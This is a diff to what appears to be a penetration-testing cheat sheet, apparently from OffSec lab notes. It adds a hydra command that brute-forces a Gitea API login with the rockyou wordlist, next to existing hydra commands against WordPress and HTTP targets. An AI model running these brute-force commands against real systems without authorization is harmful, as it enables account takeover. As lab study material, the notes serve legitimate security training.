@@ -183,6 +183,13 @@ hydra -L users.txt -P passwords.txt target.com -s 8081 http-post-form "/wp-login
 hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://target.com
 ~~~
 
+## Gitea Brute force(hydra)
+
+~~~ bash
+hydra -l Billy -P /usr/share/wordlists/rockyou.txt \
+git.offseclab.io http-get /api/v1/user
+~~~
+
 ## WordPress Security Scanner(wpscan)
 
 ~~~ bash
